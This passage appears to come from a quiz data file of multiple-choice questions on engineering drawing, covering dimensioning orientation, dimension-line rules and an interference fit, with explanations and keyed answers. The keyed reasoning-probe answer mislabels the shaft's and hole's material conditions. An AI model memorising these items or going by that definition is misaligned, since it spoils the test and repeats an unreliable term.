                    "D": "The base perimeter of a cone decreases linearly as it unrolls across the workbench."
                },
                "correct_probe": "A"
            }
        },
        {
            "concept_suffix": "c4",
            "question_type": "basic",
            "difficulty": "easy",
            "question_text": "In the Unidirectional system of engineering dimensioning, how are dimension numbers oriented?",
            "option_a": "All dimensions are placed horizontally and read exclusively from the bottom of the drawing sheet",
            "option_b": "Dimensions are aligned parallel to dimension lines and read from either bottom or right-hand edge",
            "option_c": "Dimensions are placed vertically along the left margin in alphabetical order",
            "option_d": "Dimensions are printed upside down to distinguish interior from exterior features",
            "correct_option": "A",
            "explanation": "In the Unidirectional dimensioning system, all numerical values, notes, and tolerances are placed horizontally so they can be read from the bottom of the sheet without rotating the drawing.",
            "reasoning_probe": None
        },
        {
            "concept_suffix": "c4",
            "question_type": "conceptual",
            "difficulty": "medium",
            "question_text": "Why must dimension lines never cross extension lines or other dimension lines in professional drafting?",
            "option_a": "To avoid clutter and prevent ambiguity or misreading on the factory production floor",
            "option_b": "Because intersecting ink lines dissolve the paper fibers over time",
            "option_c": "Because CAD software crashes if two vector lines share an intersection point",
            "option_d": "Because intersecting lines are legally reserved only for electrical schematic diagrams",
            "correct_option": "A",
            "explanation": "Standard dimensioning rules require placing smaller detail dimensions closer to the view and larger overall dimensions further out so that extension lines and dimension lines never cross, maintaining readability.",
            "reasoning_probe": None
        },
        {
            "concept_suffix": "c4",
            "question_type": "application",
            "difficulty": "hard",
            "question_text": "A manufacturing drawing specifies a hole diameter as 50.000 (+0.025 / -0.000) mm and a mating shaft diameter as 50.040 (+0.015 / +0.005) mm. What type of engineering fit is this?",
            "option_a": "An interference fit, because the minimum shaft diameter (50.045 mm) is strictly larger than the maximum hole diameter (50.025 mm)",
            "option_b": "A clearance fit, because the shaft will slide easily into the hole under gravity",
            "option_c": "A transition fit, because manufacturing tolerances might produce either clearance or interference",
            "option_d": "An invalid tolerance fit that cannot be produced with modern CNC machinery",
            "correct_option": "A",
            "explanation": "The maximum hole is 50.025 mm, while the minimum shaft is 50.045 mm. Since the smallest shaft is always larger than the largest hole (negative clearance of at least -0.020 mm), this is a guaranteed interference (press) fit.",
            "reasoning_probe": {
                "prompt": "What defines a guaranteed interference fit in engineering tolerance standards?",
                "options": {
                    "A": "The minimum material condition (smallest diameter) of the shaft is strictly greater than the maximum material condition (largest diameter) of the hole.",
                    "B": "The hole and shaft share the exact same nominal diameter with zero tolerance allowance.",
                    "C": "The parts can be assembled by hand without hydraulic presses or thermal expansion.",
                    "D": "The hole diameter is always at least 5 mm larger than the shaft diameter."
                },
                "correct_probe": "A"
            }
        }
    ]
}

